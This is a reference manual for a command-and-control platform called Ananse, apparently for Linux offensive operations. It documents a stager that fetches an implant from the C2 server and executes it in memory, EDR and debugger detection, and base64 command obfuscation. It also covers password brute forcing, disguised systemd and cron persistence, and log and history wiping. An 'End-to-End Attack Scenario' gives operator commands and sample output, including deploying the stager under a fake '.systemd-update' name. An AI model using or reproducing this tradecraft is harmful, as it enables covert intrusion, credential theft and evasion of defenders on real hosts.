# Ananse C2 Platform — Complete Reference

> Ananse means "spider" in Akan (Ghana). Like a spider in its web, Ananse reaches out to targets, maintains persistent presence, and pulls information back through the C2 server.

---

## 1. Architecture Overview

```
┌──────────────────────┐       HTTPS(8443)       ┌──────────────────────┐
│   OPERATOR (CLI)     │─────────────────────────→│   C2 SERVER          │
│   - ananse c2 fleet  │  REST API (apiKey auth)  │   Node.js/Express    │
│   - ananse c2 task   │←─────────────────────────│   SQLite backend     │
│   - ananse c2 kill   │     JSON responses       │   WebSocket stream   │
│   - ananse c2 server │                          │   AI analysis        │
└──────────────────────┘                          │   Task queue         │
                                                   │   Fleet registry     │
                          ┌───────────────────┐    └──────────┬───────────┘
                          │   STAGER (Go)     │               │
                          │   ~1.9 MB         │  HTTP/1.0     │
                          │   memfd loader    │───────────────┘
                          │   Download + exec │  /api/v1/stage/payload
                          └───────────────────┘    (stager token auth)
                                   │
                                   │ syscall.Exec(memfd)
                                   ▼
                          ┌───────────────────┐    HTTPS(8443)
                          │   IMPLANT (Go)     │─────────────────→
                          │   ~5 MB            │  POST /api/v1/beacon
                          │   Beacon loop      │←─────────────────
                          │   6-8 modules      │  { tasks, config, command }
                          │   Stealth engine   │
                          │   Watchdog         │
                          └───────────────────┘
```

### Two-Token Architecture

| Token | Used By | Authenticates | Scope |
|-------|---------|--------------|-------|
| `C2_STAGER_TOKEN` | Stager binary | GET /api/v1/stage/payload | One-time download |
| `C2_IMPLANT_TOKEN` | Implant binary | POST /api/v1/beacon | Ongoing C2 session |

The stager token is embedded in the stager binary at build time. Once the stager downloads the implant and exits, the stager token is irrelevant. The implant uses a **separate** token for all subsequent beacon communication. If an implant binary is captured, the stager token remains safe.

---

## 2. Components in Detail

### 2.1 C2 Server (`src/c2/server/`)

**Start:**
```bash
# Set env vars (recommended)
export C2_API_KEY="op-key-change-me"
export C2_IMPLANT_TOKEN="imp-token-change-me"
export C2_STAGER_TOKEN="stag3r-t0k3n-change"
export C2_IMPLANT_PATH="/tmp/implant"

# Start server
ananse c2-server --port 8443
```

**Files:**
- `index.ts` — Express server setup, WebSocket, route registration
- `api.ts` — Beacon endpoint + operator REST API
- `auth.ts` — API key + implant token middleware
- `fleet.ts` — Implant registry (SQLite)
- `taskQueue.ts` — Per-implant task queue (SQLite)
- `resultStore.ts` — Task result storage
- `stager.ts` — Stager payload delivery endpoint
- `ws.ts` — WebSocket live streaming for operator
- `db.ts` — SQLite init + migrations

**API Endpoints:**

| Method | Path | Auth | Purpose |
|--------|------|------|---------|
| GET | /api/v1/health | None | Health check |
| GET | /api/v1/stage/payload | X-Stager-Token | Serve implant binary |
| POST | /api/v1/beacon | X-Implant-Token | Implant heartbeat + task exchange |
| GET | /api/v1/operator/fleet | Bearer API key | List all implants |
| GET | /api/v1/operator/fleet/:id | Bearer API key | Implant details |
| POST | /api/v1/operator/task | Bearer API key | Create task |
| GET | /api/v1/operator/tasks/:implantId | Bearer API key | List tasks |
| POST | /api/v1/operator/kill/:implantId | Bearer API key | Self-destruct implant |
| GET | /api/v1/operator/ws | Bearer API key (query) | WebSocket live feed |

### 2.2 Stager (`src/c2/implant/stager/main.go`)

The stager is a tiny Go binary that:

1. Connects to the C2 server via raw TCP
2. Sends an HTTP/1.0 GET request to `/api/v1/stage/payload` with `X-Stager-Token`
3. Reads the response, parses HTTP headers
4. Optionally decrypts with AES-256-GCM (if key is set)
5. Creates an anonymous memory file descriptor via `memfd_create`
6. Writes the implant binary to the memfd
7. Executes the implant from `/proc/self/fd/N` — **no disk write**

**Build:**
```bash
# Default (localhost)
./scripts/build-stager.sh

# Production
./scripts/build-stager.sh \
  --server 10.0.0.5:8443 \
  --stager-token "s3cr3t" \
  --implant-token "different-token" \
  --aes-key "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" \
  --persist
```

**Output:**
- `/tmp/implant` — full implant binary (served by C2 server)
- `/tmp/stager` — stager binary (deployed to target)

### 2.3 Implant (`src/c2/implant/`)

The implant is a Go binary that runs on the target Linux system.

**Files:**
- `main.go` — Entry point, flag parsing, beacon loop
- `beacon/client.go` — HTTPS beacon client
- `beacon/jitter.go` — Beacon interval with adaptive jitter
- `executor/executor.go` — Shell execution wrapper
- `executor/taskrunner.go` — Task dispatch + result collection
- `module/recon.go` — Process, network, user, cron, SUID enumeration
- `module/privesc.go` — Privilege escalation checks
- `module/persistence.go` — SSH key, cron, systemd persistence
- `module/exploit.go` — Vulnerability scanning
- `module/monitor.go` — File integrity, rootkit, process monitoring
- `module/compliance.go` — SSH/PAM/mount/audit checks
- `module/sbom.go` — Software bill of materials + CVE matching
- `module/brute.go` — Brute force (sudo, SSH, local)
- `stealth/stealth.go` — Delay jitter, command obfuscation
- `stealth/profiler.go` — 3-phase defense profiling
- `watchdog/watchdog.go` — Systemd/cron persistence maintainer
- `watchdog/selfdestruct.go` — Secure binary wipe + log cleanup

**Beacon Loop:**
```
Implant starts
  ↓
POST /api/v1/beacon (ID, status, pending results)
  ↓
Parse response: { tasks, config, ackedResults, command }
  ↓
If command == "selfdestruct" → wipe and exit
  ↓
Run any assigned tasks (goroutines per task)
  ↓
Queue results internally
  ↓
Sleep (beacon interval × jitter)
  ↓
Loop → POST /api/v1/beacon (with results)
```

**Beacon interval scaling:**
| Threat Level | Multiplier | Effective Range (60s base) |
|--------------|-----------|---------------------------|
| clean | 0.5× | 21–39 s |
| low | 1× | 42–78 s |
| medium | 2× | 84–156 s |
| high | 3× | 126–234 s |
| critical | 4× | 168–312 s |

### 2.4 Stealth Profiler (`src/c2/implant/stealth/profiler.go`)

Three-phase defense detection:

1. **Passive** — Reads `/proc` for monitoring tools, debuggers, EDR processes
2. **Active** — Checks common EDR/AV paths, debugger detection (`TracerPid`), sandbox artifacts
3. **Aggressive** — Attempts `LD_PRELOAD` injection, `ptrace` attach, YAMA status

Determines threat level: `clean` | `low` | `medium` | `high` | `critical`

When threat is detected, the implant scales back beacon frequency, enables command obfuscation, and reduces module execution timeout.

### 2.5 Command Obfuscation

When stealth mode is enabled, shell commands are obfuscated via:

1. **Base64 wrap** — 40% chance: `echo <base64> | base64 -d | sh`
2. **Whitespace noise** — 20% chance: random `$' \t'` insertions
3. **Benign prefix** — 15% chance: prepend a harmless command
4. **Pass-through** — 25% chance: no obfuscation (blends in)

Disabled with `--no-obfuscate` flag on the implant.

---

## 3. Usage Examples

### 3.1 Starting the C2 Server

```bash
# Terminal 1 — start the server
$ export C2_API_KEY="op-key-change-me"
$ export C2_IMPLANT_TOKEN="imp-token-change-me"
$ export C2_STAGER_TOKEN="stag3r-t0k3n-change"
$ export C2_IMPLANT_PATH="/tmp/implant"
$ ananse c2-server --port 8443

  WARNING: Using default C2_API_KEY. Set C2_API_KEY env var for production.
  WARNING: Using default C2_IMPLANT_TOKEN. Set C2_IMPLANT_TOKEN env var for production.
  C2 server listening on 0.0.0.0:8443
  WS:    ws://localhost:8443/api/v1/operator/ws
  API:   POST /api/v1/beacon  (implant)
         GET  /api/v1/operator/fleet
         POST /api/v1/operator/task
```

### 3.2 Building the Stager + Implant

```bash
$ ./scripts/build-stager.sh \
    --server 192.168.1.100:8443 \
    --stager-token "stag3r-t0k3n-change" \
    --implant-token "imp-token-change-me" \
    --persist

  GOROOT: /tmp/go
  server: 192.168.1.100:8443
  output: /tmp/implant (full) + /tmp/stager

==> Building implant...
    5.2 MB  /tmp/implant

==> Building stager...
    1.9 MB  /tmp/stager
```

### 3.3 Fleet Management

```bash
# List all implants (empty fleet)
$ ananse c2 fleet
Fleet is empty.

# List all implants (with active implants)
$ ananse c2 fleet
┌──────────────────────────────────────┬──────────┬─────────────────┬─────────┬──────────────────┐
│ ID                                   │ NAME     │ TARGET          │ STATUS  │ LAST SEEN        │
├──────────────────────────────────────┼──────────┼─────────────────┼─────────┼──────────────────┤
│ a1b2c3d4-e5f6-7890-abcd-ef1234567890 │ target-01│ 192.168.1.50    │ active  │ 2s ago           │
│ b2c3d4e5-f6a7-8901-bcde-f12345678901 │ target-02│ 10.0.0.22       │ active  │ 45s ago          │
│ c3d4e5f6-a7b8-9012-cdef-123456789012 │ target-03│ 172.16.1.100    │ dead    │ 12m ago          │
└──────────────────────────────────────┴──────────┴─────────────────┴─────────┴──────────────────┘

# Show implant details
$ ananse c2 fleet a1b2c3d4-e5f6-7890-abcd-ef1234567890
ID:        a1b2c3d4-e5f6-7890-abcd-ef1234567890
Name:      target-01
Target:    192.168.1.50
Status:    active
First:     2026-05-27T10:15:30Z
Last:      2026-05-27T11:48:22Z
Profile:   Linux 6.2.0-36-generic #37~22.04.1 x86_64
           Threat: low
           Defenses: none detected
Tasks:     3 completed, 0 pending

# Fleet summary
$ ananse c2 fleet --summary
Total: 3 | Active: 2 | Dead: 1 | Destroyed: 0
```

### 3.4 Reconnaissance Tasks

```bash
# Enumerate running processes
$ ananse c2 task create a1b2c3d4 recon_processes
Created task: task-001
Status: pending (will be picked up on next beacon)

# After implant beacons — check result
$ ananse c2 tasks a1b2c3d4
┌──────────┬─────────────────┬───────────┬──────────────────────────────────┐
│ TASK ID  │ TYPE            │ STATUS    │ RESULT SUMMARY                   │
├──────────┼─────────────────┼───────────┼──────────────────────────────────┤
│ task-001 │ recon_processes │ completed │ 245 processes found              │
└──────────┴─────────────────┴───────────┴──────────────────────────────────┘

# View full result
$ ananse c2 task result task-001
PID  PPID  CMD
1    0     /sbin/init splash
2    0     [kthreadd]
345  1     /lib/systemd/systemd-journald
678  1     /usr/sbin/sshd -D
901  678   sshd: user@pts/0
...
=== Summary: 245 total | 1 rootkits? | 3 suspicious (miner processes checked)

# Scan network connections
$ ananse c2 task create a1b2c3d4 recon_network
$ ananse c2 task result task-002
Proto  Local Addr        Foreign Addr       State     PID
tcp    0.0.0.0:22        0.0.0.0:*          LISTEN    678
tcp    192.168.1.50:22   10.0.0.1:44022     ESTABLISH 901
tcp    127.0.0.1:3306    0.0.0.0:*          LISTEN    512
tcp6   :::80             :::*               LISTEN    789
udp    0.0.0.0:68        0.0.0.0:*                    345

=== Summary: 12 listening | 4 ESTABLISHED | 3 internal | 1 external (10.0.0.1:44022)

# Enumerate user accounts
$ ananse c2 task create a1b2c3d4 recon_users
$ ananse c2 task result task-003
=== User Accounts ===
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
ssh:x:104:65534::/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
backup:x:1005:1005::/home/backup:/bin/bash    ← non-standard, has shell

=== Recent Logins ===
user    pts/0    192.168.1.1    May 27 10:15
user    pts/1    10.0.0.1      May 26 22:30

=== Sudoers ===
user    ALL=(ALL:ALL) ALL

# Check cron jobs
$ ananse c2 task create a1b2c3d4 recon_cron
$ ananse c2 task result task-004
=== System Crontab ===
# m h dom mon dow user  command
17 *    * * *   root  cd / && run-parts --report /etc/cron.hourly
0 6    * * *   root  test -x /usr/sbin/anacron || run-parts /etc/cron.daily

=== User Crontabs ===
user  (none)
root  (none)

=== cron.d ===
/etc/cron.d/popularity-update  ← unused, safe to remove

=== cron.hourly ===
/etc/cron.hourly/systemd-update  ← suspicious — not a standard script!
```

### 3.5 Privilege Escalation Tasks

```bash
# Check sudo privileges
$ ananse c2 task create a1b2c3d4 privesc_sudo
$ ananse c2 task result task-005
=== Sudo Privileges ===
User user may run:
  (ALL : ALL) ALL                          ← full sudo access!
  (root) NOPASSWD: /usr/bin/apt-get        ← passwordless

=== Sudo History ===
sudo whoami
sudo -l
sudo apt-get update

=== writable sudoers.d ===
/etc/sudoers.d/ — user can write!          ← can add own sudo entry

# Find writable files and directories
$ ananse c2 task create a1b2c3d4 privesc_writable
$ ananse c2 task result task-006
=== World-Writable Scripts/Dirs ===
/etc/update-motd.d/                        ← writable → runs as root on SSH login
/usr/local/bin/                            ← writable → PATH hijack
/opt/backup.sh                             ← writable by all

=== Writable Passwd/Shadow ===
/etc/passwd — not writable
/etc/shadow — not writable
/etc/sudoers — not writable
```

### 3.6 Brute Force Tasks

```bash
# Brute force sudo passwords (try 20 common passwords)
$ ananse c2 task create a1b2c3d4 brute_sudo
$ ananse c2 task result task-007
=== Sudo Brute Force ===
Passwordless sudo:  no
Target user:        user
Tried:              20 passwords
  password          → FAIL (4s)   ← PAM delay
  123456            → FAIL (4s)
  qwerty            → FAIL (4s)
  letmein           → FAIL (4s)
  admin             → FAIL (4s)
  root              → FAIL (4s)
  ...

Results: 0/20 succeeded (sudo delays: ~4s per attempt)

# Brute force all local user accounts
$ ananse c2 task create a1b2c3d4 brute_local
$ ananse c2 task result task-008
=== Local Account Brute Force ===
Users with shells: user, backup

[user] Tried 20 passwords
  user:password       → SUCCESS!
  0/19 remaining failed

[backup] Tried 20 passwords
  backup:backup123    → SUCCESS!
  0/19 remaining failed

=== Summary ===
2/2 users cracked: user, backup
Time elapsed: 85s

# Full brute force (sudo + SSH + local)
$ ananse c2 task create a1b2c3d4 brute_all
$ ananse c2 task result task-009
=== Brute Force All ===
[SUDO] 0/20 — no sudo passwords cracked
[LOCAL] user:password, backup:backup123
[SSH]   Not checking SSH — sshpass not installed

=== Summary ===
2 passwords cracked, 0 sudo creds, SSH unavailable
Elapsed: 102s
```

### 3.7 Persistence Tasks

```bash
# Check existing SSH authorized keys
$ ananse c2 task create a1b2c3d4 persistence_ssh_keys
$ ananse c2 task result task-010
=== SSH Authorized Keys ===
/home/user/.ssh/authorized_keys:
  ssh-rsa AAAAB3... user@laptop    ← user's key
  ssh-ed25519 AAAAC3...            ← unknown key! (backdoor?)
  2 keys total

=== SSH Config ===
PermitRootLogin: no
PasswordAuthentication: yes         ← weak
PubkeyAuthentication: yes

# Check startup mechanisms
$ ananse c2 task create a1b2c3d4 persistence_startup
$ ananse c2 task result task-011
=== Systemd Services ===
● ssh.service         enabled  (secure)
● cron.service        enabled
● systemd-update.service  enabled  ← suspicious — unknown binary
● apache2.service     disabled

=== systemd-update.service ===
[Unit]
Description=System Update Service
[Service]
ExecStart=/usr/local/bin/systemd-update  ← implant persistence!
Restart=always
[Install]
WantedBy=multi-user.target

=== Cron Persistence ===
@reboot user /usr/local/bin/systemd-update  ← also in cron!
```

### 3.8 Monitor Tasks

```bash
# Detect rootkits
$ ananse c2 task create a1b2c3d4 monitor_rootkit
$ ananse c2 task result task-012
=== Rootkit Checks ===
┌─────────────────────┬─────────┬──────────────────────────────┐
│ Check               │ Status  │ Detail                       │
├─────────────────────┼─────────┼──────────────────────────────┤
│ TracerPid           │ 0       │ no debugger                  │
│ /proc checks        │ PASS    │ no hidden processes          │
│ LD_PRELOAD          │ CLEAN   │ no suspicious libraries      │
│ kernel modules      │ WARN    │ vboxguest loaded (unexpected)│
│ hidden files        │ CLEAN   │ no filesystem hiding         │
│ promiscuous nic     │ CLEAN   │ no promiscuous interfaces    │
└─────────────────────┴─────────┴──────────────────────────────┘

# File integrity check (monitor critical files for changes)
$ ananse c2 task create a1b2c3d4 monitor_fim
$ ananse c2 task result task-013
=== File Integrity Monitor ===
/etc/passwd:         hash match (no change)
/etc/shadow:         hash match
/etc/sudoers:        hash match
/usr/bin/sshd:       hash match
/usr/local/bin/:     NEW FILE: /usr/local/bin/systemd-update  ← unrecognized

=== Recently Modified SUIDs ===
/usr/bin/su          unchanged
/usr/bin/sudo        unchanged
/usr/bin/pkexec      unchanged
```

### 3.9 Compliance Tasks

```bash
# SSHD configuration audit
$ ananse c2 task create a1b2c3d4 compliance_sshd
$ ananse c2 task result task-014
=== SSHD Configuration ===
Port:                    22          ✓ standard
PermitRootLogin:         no          ✓ secure
PasswordAuthentication:  yes         ✗ weak — should be no
PubkeyAuthentication:    yes         ✓ secure
X11Forwarding:           yes         ✗ should be no
MaxAuthTries:            6           ✓ default
ClientAliveInterval:     0           ✗ no keepalive
AllowUsers:              user        ✓ restricted

Score: 5/8 — 2 medium issues, 1 high (PasswordAuthentication)

# Mount security audit
$ ananse c2 task create a1b2c3d4 compliance_mounts
$ ananse c2 task result task-015
=== Mount Security ===
/dev/sda1 on /        ext4  rw,relatime       ✓
tmpfs on /dev/shm     tmpfs rw,nosuid,nodev   ✓
/dev/sda2 on /home    ext4  rw,relatime       ✓
//nas/share on /mnt   cifs  rw,guest          ✗ world-accessible network mount

=== /etc/fstab Risky Entries ===
//nas/share /mnt cifs credentials=/root/.smbpasswd 0 0  ← credentials in /root/
```

### 3.10 SBOM + CVE Tasks

```bash
# Generate software bill of materials
$ ananse c2 task create a1b2c3d4 sbom_packages
$ ananse c2 task result task-016
=== Installed Packages (top 20 of 134) ===
Name              Version           Arch
openssh-server    1:8.9p1-3         amd64
openssl           3.0.2-0ubuntu1    amd64
apache2           2.4.52-1ubuntu4   amd64
nginx             1.24.0-1          amd64
mysql-server      8.0.35-0ubuntu0   amd64
php               8.1.2-1ubuntu2    amd64
docker.io         24.0.5-1          amd64

# Check for known CVEs
$ ananse c2 task create a1b2c3d4 sbom_cve
$ ananse c2 task result task-017
=== CVE Scan Results ===
┌──────────────────────┬──────────┬──────────┬────────────────────────────────┐
│ Package              │ Version  │ Severity │ CVE                            │
├──────────────────────┼──────────┼──────────┼────────────────────────────────┤
│ openssl              │ 3.0.2    │ CRITICAL │ CVE-2023-3817 (heap overflow)  │
│ openssh-server       │ 8.9p1    │ HIGH     │ CVE-2023-38408 (remote code)  │
│ apache2              │ 2.4.52   │ HIGH     │ CVE-2023-31122 (mod_proxy)    │
│ mysql-server         │ 8.0.35   │ MEDIUM   │ CVE-2023-22102 (DoS)          │
│ nginx                │ 1.24.0   │ MEDIUM   │ CVE-2023-44487 (HTTP/2)       │
└──────────────────────┴──────────┴──────────┴────────────────────────────────┘

5 CVEs found: 1 CRITICAL, 2 HIGH, 2 MEDIUM
Suggested: apt-get upgrade openssl (patch available in -ubuntu1.3)
```

### 3.11 Implant Control

```bash
# Kill an implant (self-destruct)
$ ananse c2 kill a1b2c3d4-e5f6-7890-abcd-ef1234567890
Self-destruct command sent to a1b2c3d4-e5f6-7890-abcd-ef1234567890
Status: acknowledged — implant is wiping now

# Verify it's gone
$ ananse c2 fleet a1b2c3d4-e5f6-7890-abcd-ef1234567890
Status: destroyed
Last seen: 2026-05-27T11:52:01Z (1m ago — self-destruct confirmed)

# Watch live events (WebSocket)
$ ananse c2 watch
Listening for events... (Ctrl+C to stop)

[11:48:22] a1b2c3d4 → beacon received (target-01, status: active)
[11:48:23] a1b2c3d4 → task-001 delivered (recon_processes)
[11:48:25] a1b2c3d4 → task-001 completed (245 processes)
[11:49:10] b2c3d4e5 → beacon received (target-02, status: active)
[11:49:12] b2c3d4e5 → task-002 delivered (recon_network)
[11:49:30] b2c3d4e5 → task-002 completed (12 connections)
[11:52:01] a1b2c3d4 → self-destruct acknowledged — implant destroyed
```

### 3.12 Task Lifecycle Walkthrough

```bash
# 1. Create a task — starts as "pending"
$ ananse c2 task create a1b2c3d4 recon_processes
Created task: task-001 (pending)

# 2. Implant beacons — task transitions to "delivered"
#    (happens automatically on next heartbeat)
$ ananse c2 tasks a1b2c3d4
task-001 | recon_processes | delivered | picked up by implant

# 3. Implant runs the task — status becomes "running"
$ ananse c2 tasks a1b2c3d4
task-001 | recon_processes | running  | executing (5s elapsed)

# 4. Task completes — result is available
$ ananse c2 tasks a1b2c3d4
task-001 | recon_processes | completed | 245 processes found

# 5. Cancel a task mid-flight
$ ananse c2 task create a1b2c3d4 brute_all
Created task: task-018 (pending)

# Oops, that'll take too long — cancel it
$ ananse c2 task cancel task-018
Cancelled: task-018
```

### 3.13 Cross-Implant Orchestration

```bash
# Run recon on all active implants
$ for id in $(ananse c2 fleet --active-ids); do
    ananse c2 task create "$id" recon_all
  done
task-019 created for a1b2c3d4
task-020 created for b2c3d4e5
task-021 created for d4e5f6a7

# Check all results at once
$ ananse c2 tasks --all
a1b2c3d4:  task-019 recon_all    completed (8 results)
b2c3d4e5:  task-020 recon_all    completed (7 results)
d4e5f6a7:  task-021 recon_all    running (still executing)
```

---

## 4. End-to-End Attack Scenario

### Phase 1: Setup

**Terminal 1 — Start the C2 server:**
```bash
export C2_API_KEY="op-key-change-me"
export C2_IMPLANT_TOKEN="imp-token-change-me"
export C2_STAGER_TOKEN="stag3r-t0k3n-change"
export C2_IMPLANT_PATH="/tmp/implant"

ananse c2-server --port 8443
```

**Terminal 2 — Build the stager + implant:**
```bash
./scripts/build-stager.sh \
  --server 192.168.1.100:8443 \
  --stager-token "stag3r-t0k3n-change" \
  --implant-token "imp-token-change-me" \
  --persist
```

### Phase 2: Deploy

Copy `/tmp/stager` to the target via any method:
```bash
scp /tmp/stager user@target:/tmp/.systemd-update
ssh user@target '/tmp/.systemd-update'
```

The stager:
1. Connects to the C2 server on port 8443
2. Authenticates with the stager token
3. Downloads the implant binary into memory (memfd)
4. Executes the implant from memory — no disk trace

### Phase 3: Engage

See [section 3](#3-usage-examples) for detailed output examples of each command.

```bash
# Verify implant checked in
ananse c2 fleet

# Quick reconnaissance sweep
ananse c2 task create a1b2c3d4 recon_processes
ananse c2 task create a1b2c3d4 recon_network
ananse c2 task create a1b2c3d4 recon_users
ananse c2 task create a1b2c3d4 recon_cron

# Privilege escalation
ananse c2 task create a1b2c3d4 privesc_sudo
ananse c2 task create a1b2c3d4 privesc_writable
ananse c2 task create a1b2c3d4 brute_sudo
ananse c2 task create a1b2c3d4 brute_all

# Persistence hunting
ananse c2 task create a1b2c3d4 persistence_ssh_keys
ananse c2 task create a1b2c3d4 persistence_startup

# Security audit
ananse c2 task create a1b2c3d4 compliance_sshd
ananse c2 task create a1b2c3d4 sbom_cve

# Watch results arrive live
ananse c2 watch
```

Check results as they complete:
```bash
# List all tasks for the implant
ananse c2 tasks a1b2c3d4

# View specific results
ananse c2 task result task-001  # recon_processes
ananse c2 task result task-005  # privesc_sudo
ananse c2 task result task-009  # brute_all
```

### Phase 4: Cleanup

```bash
# Self-destruct
ananse c2 kill a1b2c3d4
```

The implant will:
1. Delete its own binary from /proc/self/exe
2. Remove all persistence artifacts (systemd, cron, SSH keys)
3. Clear shell history and log entries
4. Exit

Verify destruction:
```bash
$ ananse c2 fleet a1b2c3d4
Status: destroyed
Last seen: 2026-05-27T11:52:01Z
```

---

## 5. Build & Configuration Reference

### Environment Variables

| Variable | Default | Purpose |
|----------|---------|---------|
| `C2_API_KEY` | op-key-change-me | Operator API authentication |
| `C2_IMPLANT_TOKEN` | imp-token-change-me | Implant beacon authentication |
| `C2_STAGER_TOKEN` | stag3r-t0k3n-change | Stager download authentication |
| `C2_IMPLANT_PATH` | ../implant/implant | Path to implant binary for stager endpoint |
| `C2_DEFAULT_BEACON_INTERVAL` | 60000 | Default beacon interval in ms |

### Build Script Options

```
./scripts/build-stager.sh [options]

Options:
  --server <host:port>       C2 server address (default: localhost:8443)
  --stager-token <token>     Auth token for stager download
  --implant-token <token>    Auth token for implant beacon
  --aes-key <64-char-hex>    AES-256-GCM encryption key (optional)
  --persist                  Enable persistence (default: --no-persist)
  --goroot <path>            Go root directory (default: /tmp/go)
```

### Implant Flags

```
./implant --server http://<host>:<port> --token <token> [options]

Options:
  --interval <ms>            Beacon interval (default: 60000)
  --no-persist               Disable persistence
  --no-obfuscate             Disable command obfuscation
```

---

## 6. Project Structure

```
ananse/
├── src/c2/
│   ├── types.ts                 # C2 interfaces (Implant, C2Task, etc.)
│   ├── server/
│   │   ├── index.ts             # Express server entry point
│   │   ├── api.ts               # Route definitions
│   │   ├── auth.ts              # Authentication middleware
│   │   ├── fleet.ts             # Implant registry
│   │   ├── taskQueue.ts         # Task queue (SQLite)
│   │   ├── resultStore.ts       # Result persistence
│   │   ├── stager.ts            # Payload delivery endpoint
│   │   ├── ws.ts                # WebSocket broadcaster
│   │   └── db.ts               # SQLite setup
│   ├── client/
│   │   ├── index.ts            # CLI subcommand handler
│   │   └── api.ts              # HTTP client to C2 server
│   └── implant/
│       ├── go.mod / go.sum
│       ├── main.go             # Entry point + beacon loop
│       ├── beacon/
│       │   ├── client.go       # Beacon HTTP client
│       │   └── jitter.go       # Adaptive jitter calculation
│       ├── executor/
│       │   ├── executor.go     # Shell execution
│       │   └── taskrunner.go   # Task dispatch
│       ├── module/
│       │   ├── recon.go        # Reconnaissance
│       │   ├── privesc.go      # Privilege escalation
│       │   ├── persistence.go  # Persistence mechanisms
│       │   ├── exploit.go      # Vulnerability scanning
│       │   ├── monitor.go      # Monitoring
│       │   ├── compliance.go   # Security compliance
│       │   ├── sbom.go         # SBOM + CVE
│       │   └── brute.go        # Brute force
│       ├── stealth/
│       │   ├── stealth.go      # Obfuscation + jitter
│       │   └── profiler.go     # Defense profiling
│       ├── watchdog/
│       │   ├── watchdog.go     # Self-persistence
│       │   └── selfdestruct.go # Secure cleanup
│       └── stager/
│           └── main.go         # Staged loader
├── scripts/
│   └── build-stager.sh         # Build script
└── docs/
    └── c2-platform.md          # This file
```

---

## 7. Security Notes

- **Default credentials must be changed** before any production use. All three tokens (`C2_API_KEY`, `C2_IMPLANT_TOKEN`, `C2_STAGER_TOKEN`) have obvious defaults.
- **AES encryption** is optional but recommended for staged delivery — without it, the implant binary is transmitted in cleartext over the stager channel.
- **memfd_create** leaves no file on disk but the implant still exists in memory. A forensic memory dump would recover it.
- **Self-destruct** attempts to wipe the binary and logs, but cannot guarantee complete eradication (e.g., write-protected filesystems, kernel audit logs).
- The C2 server supports only one operator at a time (no multi-operator session management).

---

## 8. The Name

Ananse (also Anansi, Kwaku Ananse) is a trickster spider from Akan folklore — small, clever, and always weaving webs. The project's commands follow this theme:

| Command | Meaning |
|---------|---------|
| `ananse c2` | The web — your view of everything connected |
| `spawn` | Deploy a new implant |
| `strand` | A single implant |
| `web` | Fleet overview |
| `bite` | Task execution (implant "bites" the target) |
| `weave` | Multi-step orchestration |
| `lure` | Phishing deployment |

*"The web remembers everything."*
